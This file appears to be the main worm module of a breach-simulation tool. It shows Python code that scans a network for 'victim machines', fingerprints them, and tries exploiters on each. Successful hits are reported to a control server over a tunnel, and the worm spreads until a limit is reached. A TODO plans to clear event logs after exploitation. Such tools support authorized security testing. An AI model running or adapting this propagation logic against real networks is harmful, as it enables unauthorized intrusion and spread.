
import sys
import time
import logging
import platform
from system_singleton import SystemSingleton
from network.firewall import app as firewall
from control import ControlClient
from config import WormConfiguration, EXTERNAL_CONFIG_FILE
from network.network_scanner import NetworkScanner
import tunnel
import getopt

__author__ = 'itamar'

LOG = logging.getLogger(__name__)

# TODO:
# 1. Remote dating of copied file
# 2. OS Detection prior to exploit
# 3. Exploit using token credentials
# 4. OS Support for exploitation modules (win / linux specific)
# 5. Linux portability
# 6. Clear eventlog after exploitation
# 7. Add colors to logger

class ChaosMonkey(object):
    def __init__(self, args):
        self._keep_running = False
        self._exploited_machines = set()
        self._fail_exploitation_machines = set()
        self._singleton = SystemSingleton()
        self._parent = None
        self._args = args

    def initialize(self):
        LOG.info("WinWorm is initializing...")

        if not self._singleton.try_lock():
            raise Exception("Another instance of the monkey is already running")

        opts, self._args = getopt.getopt(self._args, "p:", ["parent="])
        for op, val in opts:
            if op in ("-p", "--parent"):
                self._parent = val
                break

        self._keep_running = True
        self._network = NetworkScanner()
        self._dropper_path = sys.argv[0]


    def start(self):
        LOG.info("WinWorm is running...")

        if firewall.is_enabled():
            firewall.add_firewall_rule()

        ControlClient.wakeup(self._parent)
        
        monkey_tunnel = ControlClient.create_control_tunnel()
        if monkey_tunnel:
            monkey_tunnel.start()

        for _ in xrange(WormConfiguration.max_iterations):
            ControlClient.keepalive()
            ControlClient.load_control_config()

            self._network.initialize()

            self._exploiters = [exploiter() for exploiter in WormConfiguration.exploiter_classes]

            self._fingerprint = [fingerprint() for fingerprint in WormConfiguration.finger_classes]

            if not self._keep_running or not WormConfiguration.alive:
                break

            machines = self._network.get_victim_machines(WormConfiguration.scanner_class,
                                                         max_find=WormConfiguration.victims_max_find)

            for machine in machines:
                for finger in self._fingerprint:
                    LOG.info("Trying to get OS fingerprint from %r with module %s", 
                             machine, finger.__class__.__name__)
                    finger.get_host_fingerprint(machine)

                ControlClient.send_telemetry('scan', {'machine': machine.as_dict(),
                                                        'scanner' : WormConfiguration.scanner_class.__name__})                    

                # skip machines that we've already exploited
                if machine in self._exploited_machines:
                    LOG.debug("Skipping %r - already exploited",
                              machine)
                    continue
                elif machine in self._fail_exploitation_machines:
                    LOG.debug("Skipping %r - exploitation failed before",
                              machine)
                    continue

                successful_exploiter = None
                for exploiter in self._exploiters:
                    if not exploiter.is_os_supported(machine):
                        LOG.info("Skipping exploiter %s host:%r, os is not supported",
                                 exploiter.__class__.__name__, machine)
                        continue

                    LOG.info("Trying to exploit %r with exploiter %s...",
                             machine, exploiter.__class__.__name__)

                    try:
                        if exploiter.exploit_host(machine):
                            successful_exploiter = exploiter
                            break
                        else:
                            LOG.info("Failed exploiting %r with exploiter %s",
                                     machine, exploiter.__class__.__name__)
                    except Exception, exc:
                        LOG.error("Exception while attacking %s using %s: %s",
                                  machine, exploiter.__class__.__name__, exc)
                        continue

                if successful_exploiter:
                    self._exploited_machines.add(machine)
                    ControlClient.send_telemetry('exploit', {'machine': machine.__dict__, 
                                                             'exploiter': successful_exploiter.__class__.__name__})                    

                    LOG.info("Successfully propagated to %s using %s",
                             machine, successful_exploiter.__class__.__name__)

                    # check if max-exploitation limit is reached
                    if WormConfiguration.victims_max_exploit <= len(self._exploited_machines):
                        self._keep_running = False

                        LOG.info("Max exploited victims reached (%d)", WormConfiguration.victims_max_exploit)
                        break
                else:
                    self._fail_exploitation_machines.add(machine)


            time.sleep(WormConfiguration.timeout_between_iterations)

        if self._keep_running:
            LOG.info("Reached max iterations (%d)", WormConfiguration.max_iterations)

        if monkey_tunnel:
            monkey_tunnel.stop()
            monkey_tunnel.join()

    def cleanup(self):
        self._keep_running = False

        self._singleton.unlock()

        tunnel_address = ControlClient.proxies.get('https', '').replace('https://', '').split(':')[0]
        if tunnel_address:
            LOG.info("Quitting tunnel %s", tunnel_address)
            tunnel.quit_tunnel(tunnel_address)

        firewall.close()
